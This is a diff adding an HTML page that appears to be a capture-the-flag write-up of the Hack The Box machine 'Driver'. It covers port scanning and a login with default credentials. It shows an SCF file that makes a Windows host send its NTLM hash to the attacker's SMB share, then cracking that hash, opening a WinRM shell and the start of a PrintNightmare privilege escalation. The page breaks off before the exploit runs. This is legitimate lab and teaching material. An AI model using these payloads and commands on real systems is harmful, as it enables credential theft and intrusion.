@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Driver - Write up :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Driver - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/driver/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Driver - Write up">
+<meta property="og:description" content="**HTB | Driver - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/driver/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Driver.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-07 21:21:40 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/driver/">Driver - Write up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-07
+        
+      </span>
+    
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ejpt-like/">eJPT-like</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/print_nightmare/">print_nightmare</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/printer/">printer</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Driver.png"
+    class="post-cover"
+    alt="Driver - Write up"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Driver</strong> is another <strong>HTB</strong> machine where we exploit a printer.</p>
+<p>We will start by exploiting a website with a malicious <strong>SCF file</strong> that will be triggered by an admin and will send an authentication to our smb server with a hash we can crack and use with <strong>WinRM</strong>.</p>
+<p>To escalate privileges we will exploit <strong>PrintNightmare</strong>.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>nmap</strong> we find four opened ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.61.40 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-07 21:49 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 21:49
+</span></span><span style="display:flex;"><span>Scanning 10.129.61.40 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.61.40
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.129.61.40
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.129.61.40
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 10.129.61.40
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 21:50, 26.54s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.61.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>5985/tcp open  wsman
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.66 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131084</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">22</span> <span style="color:#f92672">(</span>968B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.61.40
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 80,135,445,5985
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>Now we can add some parameters to make a deeper examination:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p80,135,445,5985 10.129.61.40 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-07 21:53 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.61.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>| http-auth:
+</span></span><span style="display:flex;"><span>| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized
+</span></span><span style="display:flex;"><span>|_  Basic realm<span style="color:#f92672">=</span>MFP Firmware Update Center. Please enter password <span style="color:#66d9ef">for</span> admin
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2022-07-08T09:54:02
+</span></span><span style="display:flex;"><span>|_  start_date: 2022-07-08T08:37:23
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 48.44 seconds
+</span></span></code></pre></div><p>Let&rsquo;s start by taking a look at the website:</p>
+<p>We need credentials, before trying bruteforce or moving on we can try some default ones like <strong>admin:admin</strong>:</p>
+
+  <img src="/img/dri1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We are in.</p>
+
+  <img src="/img/dri2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Every link inside the website is useless except for <em>Firmware Updates</em>:</p>
+
+  <img src="/img/dri3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong><code>Foothold</code></strong></p>
+<p>We are able to upload a file that will be reviewed:</p>
+
+  <img src="/img/dri4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This leads me to think about a <strong>SCF File attack</strong>:</p>
+<p>A file that references an icon file on an SMB share on an attacker-controlled host.
+If the folder containing the .scf file is opened with File Explorer, the .scf will inspire Explorer to connect back to get that icon file, and offer Net-NTLMv2 auth negotiation.</p>
+<p>As we are hosting the server we will get this to our terminal.</p>
+<p>The file should have this syntax:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Command<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>IconFile<span style="color:#f92672">=</span><span style="color:#ae81ff">\\</span>10.10.14.161<span style="color:#ae81ff">\s</span>mbFolder<span style="color:#ae81ff">\p</span>wned
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Taskbar<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Command<span style="color:#f92672">=</span>ToggleDesktop
+</span></span></code></pre></div><p>Now we have to host a <strong>smb server</strong> named <strong>smbFolder</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>Let&rsquo;s upload the file and wait for the authentication:
+
+  <img src="/img/dri5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Incoming connection <span style="color:#f92672">(</span>10.129.61.40,49414<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AUTHENTICATE_MESSAGE <span style="color:#f92672">(</span>DRIVER	ony,DRIVER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User DRIVER	ony authenticated successfully
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> tony::DRIVER:aaaaaaaaaaaaaaaa:ba5d296335485c0164eff77162bac3ea:010100000000000080ac2d637b92d8018be15ee43ca77c4b000000000100100073007400450073004c0075007a0045000300100073007400450073004c0075007a0045000200100058006f0074004d004a006a005a007a000400100058006f0074004d004a006a005a007a000700080080ac2d637b92d801060004000200000008003000300000000000000000000000002000001a71b4dfdc070c63cadceadff7fa602caf0dc6cbc69d0e03ff09fc5f92773c3a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310036003100000000000000000000000000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting Share<span style="color:#f92672">(</span>1:IPC$<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting Share<span style="color:#f92672">(</span>2:smbFolder<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>There it is, now we can try to crack this Net-NTLMv2 hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#39;tony::DRIVER:aaaaaaaaaaaaaaaa:ba5d296335485c0164eff77162bac3ea:010100000000000080ac2d637b92d8018be15ee43ca77c4b000000000100100073007400450073004c0075007a0045000300100073007400450073004c0075007a0045000200100058006f0074004d004a006a005a007a000400100058006f0074004d004a006a005a007a000700080080ac2d637b92d801060004000200000008003000300000000000000000000000002000001a71b4dfdc070c63cadceadff7fa602caf0dc6cbc69d0e03ff09fc5f92773c3a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310036003100000000000000000000000000&#39;</span> &gt; hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ john --wordlist<span style="color:#f92672">=</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>netntlmv2, NTLMv2 C/R <span style="color:#f92672">[</span>MD4 HMAC-MD5 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>liltony          <span style="color:#f92672">(</span>tony<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2022-07-07 22:35<span style="color:#f92672">)</span> 3.571g/s 468114p/s 468114c/s 468114C/s 123456..koryna
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>WinRM port (5965) is opened in the machine, so we can quickly test if these credentials work using <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ crackmapexec winrm 10.129.61.40 -u <span style="color:#e6db74">&#39;tony&#39;</span> -p <span style="color:#e6db74">&#39;liltony&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.129.61.40    <span style="color:#ae81ff">5985</span>   NONE             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> None <span style="color:#f92672">(</span>name:10.129.61.40<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:None<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        10.129.61.40    <span style="color:#ae81ff">5985</span>   NONE             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://10.129.61.40:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       10.129.61.40    <span style="color:#ae81ff">5985</span>   NONE             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> None<span style="color:#ae81ff">\t</span>ony:liltony <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We get <em>(Pwn3d!)</em>, this means the credentials are valid and we are good to use <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -i 10.129.61.40 -u <span style="color:#e6db74">&#39;tony&#39;</span> -p <span style="color:#e6db74">&#39;liltony&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>Nice, we can find the user flag in the <strong>Desktop</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:sers	ony<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---         7/8/2022   1:38 AM             <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>cd4d8fd38264a748****************
+</span></span></code></pre></div><p><strong><code>Privilege escalation</code></strong></p>
+<p>We are going to deploy <strong>winPEAS.exe</strong> to enumerate the machine.</p>
+<p>With <strong>evil-winrm</strong> we can quickly upload a file with the <strong>upload</strong> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; upload /home/logan/Desktop/Tools/Windows/winPEASx64.exe
+</span></span><span style="display:flex;"><span>Info: Uploading /home/logan/Desktop/Tools/Windows/winPEASx64.exe to C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc<span style="color:#ae81ff">\w</span>inPEASx64.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: <span style="color:#ae81ff">2581160</span> bytes of <span style="color:#ae81ff">2581160</span> bytes copied
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span></code></pre></div><p>Now we laucgh it and wait for something useful&hellip;</p>
+
+  <img src="/img/dri6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s remember that the website was about a printer so keeping that in mind we find this in the scan:</p>
+
+  <img src="/img/dri7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/dri8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This process is related to the printing service inside a host:</p>
+
+  <img src="/img/dri9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There&rsquo;s a famous vulnerability about <strong>Windows Print Spooler</strong> konwn as <strong>PrintNightmare</strong> where we are able to create a privileged user.</p>
+<p>Since we are in a powershell we are going to look for a <strong>.ps1</strong> version of this exploit:</p>
+
+  <img src="/img/dri10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This one looks good so let&rsquo;s upload it.</p>
+<p>It&rsquo;s usage is very simple, first we have to import it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; Import-Module .<span style="color:#ae81ff">\C</span>VE-2021-1675.ps1
+</span></span><span style="display:flex;"><span>File C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc<span style="color:#ae81ff">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span style="color:#f92672">=</span>135170.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ Import-Module .<span style="color:#ae81ff">\C</span>VE-2021-1675.ps1
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : SecurityError: <span style="color:#f92672">(</span>:<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Import-Module<span style="color:#f92672">]</span>, PSSecurityException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+</span></span></code></pre></div><p>We get this error but we can quickly fix it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; Import-Module .<span style="color:#ae81ff">\C</span>VE-2021-1675.ps1
+</span></span></code></pre></div><p>Now we can execute it:</p>
